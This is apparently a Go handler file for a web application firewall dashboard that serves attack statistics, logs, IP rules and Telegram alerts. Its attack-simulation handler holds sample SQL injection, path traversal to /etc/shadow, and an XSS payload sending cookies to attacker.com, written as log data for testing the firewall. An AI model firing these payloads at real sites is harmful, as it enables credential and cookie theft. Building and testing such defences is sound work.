package handlers

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"time"
	"waf-backend/database"
	"waf-backend/services"

	"github.com/gin-gonic/gin"
)

type StatsResponse struct {
	TotalAttacks    int64            `json:"total_attacks"`
	AttacksToday    int64            `json:"attacks_today"`
	BlockedIPs      int64            `json:"blocked_ips"`
	WhitelistedIPs  int64            `json:"whitelisted_ips"`
	AttackTypes     map[string]int64 `json:"attack_types"`
	TopAttackerIPs  []IPCount        `json:"top_attacker_ips"`
	RecentTimeline  []TimelinePoint  `json:"recent_timeline"`
}

type IPCount struct {
	IP    string `json:"ip"`
	Count int64  `json:"count"`
}

type TimelinePoint struct {
	Hour  string `json:"hour"`
	Count int64  `json:"count"`
}

func GetStats(c *gin.Context) {
	var totalAttacks int64
	_ = database.DB.QueryRow("SELECT COUNT(*) FROM attack_logs").Scan(&totalAttacks)

	var attacksToday int64
	_ = database.DB.QueryRow("SELECT COUNT(*) FROM attack_logs WHERE date(timestamp) = date('now')").Scan(&attacksToday)

	var blockedIPs int64
	_ = database.DB.QueryRow("SELECT COUNT(*) FROM ip_rules WHERE rule_type = 'blacklist'").Scan(&blockedIPs)

	var whitelistedIPs int64
	_ = database.DB.QueryRow("SELECT COUNT(*) FROM ip_rules WHERE rule_type = 'whitelist'").Scan(&whitelistedIPs)

	// Attack types
	attackTypes := make(map[string]int64)
	rows, err := database.DB.Query("SELECT COALESCE(attack_type, 'Others'), COUNT(*) FROM attack_logs GROUP BY attack_type")
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var aType string
			var count int64
			if err := rows.Scan(&aType, &count); err == nil {
				attackTypes[aType] = count
			}
		}
	}

	// Top Attacker IPs
	var topIPs []IPCount
	ipRows, err := database.DB.Query("SELECT client_ip, COUNT(*) as c FROM attack_logs GROUP BY client_ip ORDER BY c DESC LIMIT 5")
	if err == nil {
		defer ipRows.Close()
		for ipRows.Next() {
			var item IPCount
			if err := ipRows.Scan(&item.IP, &item.Count); err == nil {
				topIPs = append(topIPs, item)
			}
		}
	}

	// Timeline (last 24 hours / entries)
	var timeline []TimelinePoint
	timeRows, err := database.DB.Query(`
		SELECT strftime('%H:00', timestamp) as hr, COUNT(*) 
		FROM attack_logs 
		WHERE timestamp >= datetime('now', '-24 hours') 
		GROUP BY hr ORDER BY hr ASC
	`)
	if err == nil {
		defer timeRows.Close()
		for timeRows.Next() {
			var tp TimelinePoint
			if err := timeRows.Scan(&tp.Hour, &tp.Count); err == nil {
				timeline = append(timeline, tp)
			}
		}
	}

	c.JSON(http.StatusOK, StatsResponse{
		TotalAttacks:   totalAttacks,
		AttacksToday:   attacksToday,
		BlockedIPs:     blockedIPs,
		WhitelistedIPs: whitelistedIPs,
		AttackTypes:    attackTypes,
		TopAttackerIPs: topIPs,
		RecentTimeline: timeline,
	})
}

func GetLogs(c *gin.Context) {
	limitStr := c.DefaultQuery("limit", "50")
	pageStr := c.DefaultQuery("page", "1")
	attackType := c.Query("type")
	ip := c.Query("ip")

	limit, _ := strconv.Atoi(limitStr)
	page, _ := strconv.Atoi(pageStr)
	if page < 1 {
		page = 1
	}
	offset := (page - 1) * limit

	query := "SELECT id, txn_id, client_ip, timestamp, method, uri, user_agent, attack_type, rule_id, rule_msg, action, status, raw_payload FROM attack_logs WHERE 1=1"
	var args []interface{}

	if attackType != "" {
		query += " AND attack_type = ?"
		args = append(args, attackType)
	}
	if ip != "" {
		query += " AND client_ip LIKE ?"
		args = append(args, "%"+ip+"%")
	}

	query += " ORDER BY id DESC LIMIT ? OFFSET ?"
	args = append(args, limit, offset)

	rows, err := database.DB.Query(query, args...)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer rows.Close()

	var logs []database.AttackLog
	for rows.Next() {
		var l database.AttackLog
		if err := rows.Scan(&l.ID, &l.TxnID, &l.ClientIP, &l.Timestamp, &l.Method, &l.URI, &l.UserAgent, &l.AttackType, &l.RuleID, &l.RuleMsg, &l.Action, &l.Status, &l.RawPayload); err == nil {
			logs = append(logs, l)
		}
	}

	c.JSON(http.StatusOK, gin.H{
		"data":  logs,
		"page":  page,
		"limit": limit,
	})
}

func GetIPRules(c *gin.Context) {
	rows, err := database.DB.Query("SELECT id, ip, rule_type, reason, created_at FROM ip_rules ORDER BY id DESC")
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer rows.Close()

	var rules []database.IPRule
	for rows.Next() {
		var r database.IPRule
		if err := rows.Scan(&r.ID, &r.IP, &r.RuleType, &r.Reason, &r.CreatedAt); err == nil {
			rules = append(rules, r)
		}
	}
	c.JSON(http.StatusOK, rules)
}

func AddIPRule(c *gin.Context) {
	var req database.IPRule
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input"})
		return
	}

	if req.IP == "" || (req.RuleType != "blacklist" && req.RuleType != "whitelist") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid IP or Rule Type"})
		return
	}

	_, err := database.DB.Exec(
		"INSERT INTO ip_rules (ip, rule_type, reason) VALUES (?, ?, ?) ON CONFLICT(ip) DO UPDATE SET rule_type=excluded.rule_type, reason=excluded.reason",
		req.IP, req.RuleType, req.Reason,
	)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "IP rule saved successfully"})
}

func DeleteIPRule(c *gin.Context) {
	id := c.Param("id")
	_, err := database.DB.Exec("DELETE FROM ip_rules WHERE id = ?", id)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "IP rule deleted successfully"})
}

func GetTelegram(c *gin.Context) {
	cfg := services.GetTelegramConfig()
	c.JSON(http.StatusOK, cfg)
}

func UpdateTelegram(c *gin.Context) {
	var cfg database.TelegramConfig
	if err := c.ShouldBindJSON(&cfg); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid format"})
		return
	}

	if err := services.SaveTelegramConfig(cfg); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Telegram configuration saved successfully"})
}

func TestTelegram(c *gin.Context) {
	cfg := services.GetTelegramConfig()
	if cfg.BotToken == "" || cfg.ChatID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Bot Token and Chat ID must be configured first"})
		return
	}

	testMsg := "🎉 <b>[CORAZA WAF TEST] Kết Nối Thành Công!</b>\n\n" +
		"Hệ thống Tường lửa Coraza SPOA + HAProxy đã kết nối thành công với Bot Telegram.\n" +
		"Các cảnh báo tấn công SQLi, XSS, RCE, LFI sẽ được gửi trực tiếp tới đây trong thời gian thực."

	err := services.SendTelegramMessage(cfg.BotToken, cfg.ChatID, testMsg)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("Failed to send message: %v", err)})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "Test notification sent successfully to Telegram!"})
}

func SimulateAttack(c *gin.Context) {
	attackType := c.DefaultQuery("type", "sqli")

	var logItem database.AttackLog
	switch attackType {
	case "sqli":
		logItem = database.AttackLog{
			TxnID:      fmt.Sprintf("sim-%d", time.Now().UnixNano()),
			ClientIP:   "192.168.246.1",
			Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
			Method:     "GET",
			URI:        "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Simulation/1.0",
			AttackType: "SQL Injection (SQLi)",
			RuleID:     942100,
			RuleMsg:    "SQL Injection Attack: SQL Operator Detected",
			Action:     "DENY",
			Status:     403,
			RawPayload: "id=1 UNION SELECT username,password FROM users--",
		}
	case "xss":
		logItem = database.AttackLog{
			TxnID:      fmt.Sprintf("sim-%d", time.Now().UnixNano()),
			ClientIP:   "192.168.246.1",
			Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
			Method:     "GET",
			URI:        "/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Simulation/1.0",
			AttackType: "Cross-Site Scripting (XSS)",
			RuleID:     941100,
			RuleMsg:    "XSS Filter - Category 1: Script Tag Vector",
			Action:     "DENY",
			Status:     403,
			RawPayload: "<script>document.location=...</script>",
		}
	case "lfi":
		logItem = database.AttackLog{
			TxnID:      fmt.Sprintf("sim-%d", time.Now().UnixNano()),
			ClientIP:   "192.168.246.1",
			Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
			Method:     "GET",
			URI:        "/?page=../../../../etc/shadow",
			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Simulation/1.0",
			AttackType: "Path Traversal (LFI)",
			RuleID:     930100,
			RuleMsg:    "Path Traversal Attack (/../)",
			Action:     "DENY",
			Status:     403,
			RawPayload: "page=../../../../etc/shadow",
		}
	}

	res, _ := database.DB.Exec(
		`INSERT INTO attack_logs (txn_id, client_ip, timestamp, method, uri, user_agent, attack_type, rule_id, rule_msg, action, status, raw_payload)
		 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		logItem.TxnID, logItem.ClientIP, logItem.Timestamp, logItem.Method, logItem.URI, logItem.UserAgent,
		logItem.AttackType, logItem.RuleID, logItem.RuleMsg, logItem.Action, logItem.Status, logItem.RawPayload,
	)
	if res != nil {
		id, _ := res.LastInsertId()
		logItem.ID = id
	}

	jsonBytes, _ := json.Marshal(map[string]interface{}{
		"event": "new_attack",
		"data":  logItem,
	})
	services.BroadcastEvent(jsonBytes)
	services.SendAttackAlert(logItem)

	c.JSON(http.StatusOK, gin.H{"message": "Simulated attack event triggered successfully", "data": logItem})
}

func GetRules(c *gin.Context) {
	rules := []map[string]interface{}{
		{"id": 1001, "name": "Smoke Test Signature Rule", "category": "Custom", "status": "Active", "action": "403 Deny"},
		{"id": 1002, "name": "Malicious Security Scanner Blocker", "category": "Scanner", "status": "Active", "action": "403 Deny"},
		{"id": 1003, "name": "Generic SQL Injection Filter", "category": "SQLi", "status": "Active", "action": "403 Deny"},
		{"id": 1004, "name": "Cross-Site Scripting (XSS) Protection", "category": "XSS", "status": "Active", "action": "403 Deny"},
		{"id": 1005, "name": "Path Traversal & Local File Inclusion", "category": "LFI", "status": "Active", "action": "403 Deny"},
		{"id": 942100, "name": "OWASP CRS v4.9: SQL Injection Protection", "category": "OWASP CRS", "status": "Active", "action": "403 Deny"},
		{"id": 941100, "name": "OWASP CRS v4.9: XSS Filters & Script Vectors", "category": "OWASP CRS", "status": "Active", "action": "403 Deny"},
		{"id": 932100, "name": "OWASP CRS v4.9: Remote Code Execution (RCE)", "category": "OWASP CRS", "status": "Active", "action": "403 Deny"},
		{"id": 930100, "name": "OWASP CRS v4.9: Path Traversal & LFI Filter", "category": "OWASP CRS", "status": "Active", "action": "403 Deny"},
	}
	c.JSON(http.StatusOK, rules)
}
